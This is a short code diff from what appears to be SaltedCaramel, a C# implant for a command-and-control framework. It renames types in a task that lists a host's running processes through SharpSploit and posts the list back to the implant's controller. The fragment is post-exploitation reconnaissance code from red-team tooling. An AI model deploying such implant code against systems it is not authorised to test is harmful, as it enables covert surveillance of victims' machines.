@@ -7,7 +7,7 @@ namespace SaltedCaramel.Tasks
 {
     class ProcessList
     {
-        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
+        internal static void Execute(SCTask task, SCImplant implant)
         {
             // Using SharpSploit to pull process list in order to get parent PID
             SharpSploitResultList<Host.ProcessResult> processResult = Host.GetProcessList();
@@ -23,8 +23,8 @@ namespace SaltedCaramel.Tasks
             }
             processResult.Clear();
 
-            TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(procList), task.id);
-            implant.PostResponse(response);
+            SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(procList), task.id);
+            implant.SCPostResp(response);
             implant.SendComplete(task.id);
         }
     }
